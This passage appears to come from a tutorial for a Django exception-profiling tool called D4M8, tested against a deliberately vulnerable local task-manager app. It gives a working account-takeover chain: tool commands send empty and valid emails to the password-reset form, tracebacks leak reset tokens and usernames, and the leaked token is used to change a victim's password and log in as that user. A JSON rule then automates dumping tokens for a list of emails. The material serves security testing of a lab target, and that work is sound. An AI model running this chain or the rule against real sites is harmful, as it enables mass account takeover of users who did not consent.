                    value: IntegrityError('NOT NULL constraint failed: taskManager_project_users_assigned.user_id')
                       tb: <traceback object at 0x7fa3771daf00>
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/backends/utils.py
             Function: execute
         Line trigger: 64   return self.cursor.execute(sql, params)

                  ‚óé  vars 

                     self: <django.db.backends.utils.CursorDebugWrapper object at 0x7fa35ef9ec10>
                      sql: ('INSERT INTO "taskManager_project_users_assigned" ("project_id", "user_id") ' 'SELECT %s AS "project_id", %s AS "user_id"')
                   params: (32, None)
          ‚û§  Trigger 

               Module: /usr/local/lib/python3.8/site-packages/django/db/backends/sqlite3/base.py
             Function: execute
         Line trigger: 318   return Database.Cursor.execute(self, query, params)

                  ‚óé  vars 

                     self: <django.db.backends.sqlite3.base.SQLiteCursorWrapper object at 0x7fa35f7c1040>
                    query: ('INSERT INTO "taskManager_project_users_assigned" ("project_id", "user_id") ' 'SELECT ? AS "project_id", ? AS "user_id"')
                   params: (32, None)
          ‚û§  Trigger 

               Module: /app/taskManager/views.py
             Function: project_create
         Line trigger: 339   project.users_assigned = [request.user.id]

                  ‚óé  vars 

                    title: False
                     text: False
         project_priority: 0
                      now: datetime.datetime(2025, 6, 13, 22, 25, 43, 438943, tzinfo=<UTC>)
          project_duedate: datetime.datetime(1970, 1, 1, 0, 0, tzinfo=<django.utils.timezone.LocalTimezone object at 0x7fa3774141f0>)
                  project: Error in formatting: TypeError: __str__ returned non-string (type bool)
```

</details>

### Analyzing Exception Significance
Looking at the "Reason" field in exception details helps determine investigation priority. `A violation of a Django database relation occurred` sounds more interesting from an attacker's perspective than an `inappropriate argument value during type conversion.`
Consider this: Why is this triggering a database exception with a `NOT NULL constraint violation` regarding a `user_id` parameter when submitting a form to `http://localhost:8000/taskManager/project_create/` without tampering with any user ID-related fields?

This suggests a potential authentication and authorization problem where:

1. Forms can be submitted that modify database data
2. The application fails to properly attribute actions to authenticated users
3. Unauthenticated requests (user_id == None) can trigger database operations

The SQL query shows:
```Python
sql: ('QUERY = \'INSERT INTO "taskManager_project_users_assigned" ("project_id", ' '"user_id") SELECT %s AS "project_id", %s AS "user_id"\' - PARAMS = (30, ' 'None)')
             
```

We may have identified an authentication and authorization vulnerability:
![image](https://github.com/user-attachments/assets/21a53156-3d00-4f13-ab47-ddbe1bc7257f)

In practice, that'll be something we'll take some time to evaluate further, but in this case, we're looking for something else. 

### Targeted Testing: Password Reset Functionality

The application uses user email addresses for password reset operations:
![image](https://github.com/user-attachments/assets/3cdd0f66-5ce5-4a92-af5d-56fe8dff499b)

We can target this specific functionality:
```python
vimana run d4m8 \
	--target-url http://127.0.0.1:8000 \
	--set-path /taskManager/forgot_password \
	--data '{"email":""}' 
```

#### Empty Email Field Test

Submitting an empty email field produces a `RelatedObjectDoesNotExist` exception:
![image](https://github.com/user-attachments/assets/95e5ae43-9fd7-4b7c-a071-2b03645de28b)

Following the exception traceback, we can examine variables in the Django application (/app/taskManager/views.py) that reveal important password reset logic and sensitive information:
![image](https://github.com/user-attachments/assets/470e5a24-6cd7-45ab-8354-b69f681d8616)

<details>
<summary>Show full RelatedObjectDoesNotExist Traceback</summary>

```python
[2025-06-16 14:16:20.814035] ‚Üí Starting D4M8 against 1 inital URL...


 ‚Æö              Request                       

       Content-Type: application/x-www-form-urlencoded
            Referer: http://127.0.0.1:8000/taskManager/forgot_password/
             Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en
    Accept-Encoding: gzip, deflate, br, zstd
       csrfmiddlewaretoken: None

              email: 

	   <input type="email" name="email" class="form-control">                                             

 ‚Æò             Response                       

               Date: Mon, 16 Jun 2025 17:16:33 GMT
             Server: WSGIServer/0.2 CPython/3.6.9
       Content-Type: text/html
    X-Frame-Options: SAMEORIGIN

    RelatedObjectDoesNotExist 

             Reason: None
           Category: None
     Request Method: POST
        Request URL: http://127.0.0.1:8000/taskManager/forgot_password/
     Django Version: 1.8.3
    Exception Value: ['User has no userprofile.']
 Exception Location: /app/venv/lib/python3.6/site-packages/django/db/models/fields/related.py in __get__, line 470
  Python Executable: /app/venv/bin/python
     Python Version: 3.6.9
        Python Path: ['/app\n /app/venv/lib/python36.zip\n /app/venv/lib/python3.6\n /app/venv/lib/python3.6/lib-dynload\n /usr/lib/python3.6\n /app/venv/lib/python3.6/site-packages']
        Server time: Mon, 16 Jun 2025 17:16:33 +0000

          ‚û§  Trigger 

               Module: /app/venv/lib/python3.6/site-packages/django/core/handlers/base.py
             Function: get_response
         Line trigger: 132   response = wrapped_callback(request, *callback_args, **callback_kwargs)

                  ‚óé  vars 

         wrapped_callback: <function forgot_password at 0x7f0adb37a9d8>
          callback_kwargs: {}
            callback_args: ()
                 callback: <function forgot_password at 0x7f0adb37a9d8>
           resolver_match: ResolverMatch(func=taskManager.views.forgot_password, args=(), kwargs={}, url_name=forgot_password, app_name=None, namespaces=['taskManager'])
        middleware_method: <bound method CsrfViewMiddleware.process_view of <django.middleware.csrf.CsrfViewMiddleware object at 0x7f0adb3ca3c8>>
                 response: None
                 resolver: <RegexURLResolver 'taskManager.urls' (None:None) ^/>
                  urlconf: 'taskManager.urls'
                     self: <django.core.handlers.wsgi.WSGIHandler object at 0x7f0add275da0>
          ‚û§  Trigger 

               Module: /app/venv/lib/python3.6/site-packages/django/views/decorators/csrf.py
             Function: wrapped_view
         Line trigger: 58   return view_func(*args, **kwargs)

                  ‚óé  vars 

                   kwargs: {}
                     args: (<WSGIRequest: POST '/taskManager/forgot_password/'>,)
                view_func: <function forgot_password at 0x7f0adb37a950>
          ‚û§  Trigger 

               Module: /app/venv/lib/python3.6/site-packages/django/db/models/fields/related.py
             Function: __get__
         Line trigger: 470   self.related.get_accessor_name()

                  ‚óé  vars 

                 rh_field: <django.db.models.fields.AutoField: id>
                 lh_field: <django.db.models.fields.related.OneToOneField: user>
                   params: {'user__id': 8}
               related_pk: 8
                  rel_obj: None
            instance_type: <class 'django.contrib.auth.models.User'>
                 instance: <User: belchior>
                     self: <django.db.models.fields.related.SingleRelatedObjectDescriptor object at 0x7f0adcb79588>
          ‚û§  Trigger 

               Module: /app/taskManager/views.py
             Function: forgot_password
         Line trigger: 795   reset_user.userprofile.reset_token = reset_token

                  ‚óé  vars 

              reset_token: '132222'
                        x: 27
                     nums: [132, 222, 2, 241, 127, 27]
                      res: '132222224112727'
               reset_user: <User: belchior>
                  t_email: ''

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 ‚û§ Endpoints missing csrftokenmiddleware:

   These endpoints are associated with data-modifying actions
   performed through web forms in a Django application. Despite
   not implementing Django's csrftokenmiddleware, they are
   vulnerable to CSRF attacks.

            Date: Mon, 16 Jun 2025 17:16:33 GMT
          Server: WSGIServer/0.2 CPython/3.6.9
    Content-Type: text/html
 X-Frame-Options: SAMEORIGIN
  Django Version: 1.8.3
  Python Version: 3.6.9
          Target: http://127.0.0.1:8000

         status: 200
            url: http://127.0.0.1:8000/taskManager/forgot_password/
           form:
	   <input type="email" name="email" class="form-control">

      

```
</details>

We've successfully leaked interesting information about user accounts, including a reset token and username, while submitting a form with an empty email field. However, this appears to be test data since there's no email associated with the leaked information.

#### Valid Email Field Test

Now let's test with a valid email address from a previously registered user `ags1@mtx.com`:

```python
vimana run d4m8 \
	--target-url http://127.0.0.1:8000 \
	--set-path /taskManager/forgot_password \
	--data '{"email":"ags1@mtx.com"}' 
```

This generates a `ConnectionRefusedError`:
![image](https://github.com/user-attachments/assets/1bfa78bc-cf45-436d-a71d-8e00b34aed5f)

In the diagram below, you can see why a `ConnectionRefusedError` in this context can be handy:
![image](https://github.com/user-attachments/assets/e7192897-7e25-4016-baa9-f547478779de)

Following the `ConnectionRefusedError` traceback we can see these trigger's vars below, specifically related to the django application's views module:
![image](https://github.com/user-attachments/assets/ac22f503-10cb-44b7-b6be-f2ebc5893fad)

A `ConnectionRefusedError` exception in this context indicates that the application attempted to send an email through an SMTP server but failed to connect. This confirms that:

1. The email address exists in the system
2. The password reset process was initiated
3. The application tried to send a reset email

Now we have everything needed to change the user's password:

* reset_token: '206112'
* reset_user: neois0ver
* t_email: ags1@mtx.com

Exploiting the Information Leak
Starting with just an email address, we've obtained:

1. The corresponding username (required for authentication)
2. A valid reset token
3. Confirmation that the account exists

Login Page:
![image](https://github.com/user-attachments/assets/dfa3bc07-b455-4220-9dca-1b984e6d404c)

#### Testing the Reset Token:

Testing if the reset token is valid by changing the neois0ver user password, for the sake of practicality, we're using the token as password
![image](https://github.com/user-attachments/assets/fcf9c3a5-4ae6-4acf-aa4f-f6adcdc9d9e5)
If no error is returned, we successfully changed the neois0ver password, let's check it by authenticating with that credential:

#### Authenticating with Compromised Credentials:
![image](https://github.com/user-attachments/assets/d74c07dc-7323-4a67-b76f-953bff8db1da)

![image](https://github.com/user-attachments/assets/f8f72d0c-16bb-4b39-a3c4-bbf63b073b80)
This successfully authenticates us as the compromised user.

### Targeted Testing: Password Reset Functionality

Manually analyzing multiple emails becomes challenging when testing many accounts. D4M8 supports rules to automate this process for multiple emails or any form field in the target application.

### Creating Automation Rules

Considering the leaked variables in the application's views:
```Python

          ‚û§  Trigger 

               Module: /app/taskManager/views.py
             Function: forgot_password
         Line trigger: 802   "You can reset your password at /taskManager/reset_password/. Use \"{}\" as your token. This link will only work for 10 minutes.".format(reset_token))

                  ‚óé  vars 

              reset_token: '206112'
                        x: 226
                     nums: [206, 112, 138, 51, 16, 226]
                      res: '2061121385116226'
               reset_user: <User: neois0ver>
                  t_email: 'ags1@mtx.com'

```


We can create automation rules with these requirements:
* Path: `/taskManager/forgot_password/`
* Method: `POST`
* Target Exception: `ConnectionRefusedError`
* Target Module: `/app/taskManager/views.py`
* Target Function: `forgot_password`
* Variables:
  - `reset_token`
  - `reset_user`
  - `t_email`
    
### Rule Configuration

And finally, we can create a rule like this `siddhis/d4m8/rules/ConnectionRefusedError_AccountsDump.json`:
```json
{
    "FUZZER_SETTINGS": {
	"silent": true
    },
    "REQUEST": {
        "request_method": "POST",
        "request_urls": [
	    "http://127.0.0.1:8000/taskManager/forgot_password/"
	],
        "form_target_input_data": {
	    "email": "/tmp/d4m8_test_emails.txt"
	},
        "use_post_data": false,
        "use_request_file": false
    },
    "RESPONSE": {
        "target_exception_types": [
	    "ConnectionRefusedError"
	],
        "target_modules": [
	    "views.py"
	],
        "target_module_functions": [
	    "forgot_password",
	    "recover_password"
	]
    },
    "ACTIONS":[
        {
            "action_type": "extract_function_vars",
	    "function_vars": {
                "reset_user":"<User:\\s*(.*?)>",
                "t_email":false,
                "reset_token":false,
		"res":false
	    }
        }		
    ],
    "OUTPUT":  {
    	"format": "table"
    }
}


```

Here you can see the list of emails gathered in `/tmp/d4m8_test_emails.txt`:
```
ags1@mtx.com
cosmicrain@hotmail.com
jimlovespam@thedoors.com
jh1942@guitarheroes.com
visi02@gmaill.com
gsam@kafka.esc
ramalhesbusiness@protonmail.com
```

### Executing the Rule-Based Scan

Now we need to scan using this rule (saved in `siddhis/d4m8/rules/`) using --scan-rules:
![image](https://github.com/user-attachments/assets/13f1c276-abd0-40f7-8a9b-66814094d976)

The command runs in silent mode (as specified in the rule), processing all email addresses and extracting the required information.
```Python
vimana ruin d4m8 --scan-rules
```
![image](https://github.com/user-attachments/assets/30de3117-a874-4a44-8d7e-36d7d67d6bf2)

Now you have all the usernames and reset tokens for the tested email addresses.

## Conclusion

This demonstrates a straightforward use case for D4M8, showing how exception profiling can reveal sensitive information and security vulnerabilities in Django web applications. The tool's ability to systematically trigger and analyze exceptions provides valuable insights into application behavior and potential attack vectors.
The key advantages of D4M8 include:

* Systematic Discovery: Automatically identifies and tests form endpoints
* Exception Analysis: Extracts meaningful information from error conditions
* Rule-Based Automation: Scales testing across multiple targets
* Information Correlation: Maps relationships between user inputs and system responses
* Security Assessment: Identifies authentication, authorization, and information disclosure vulnerabilities
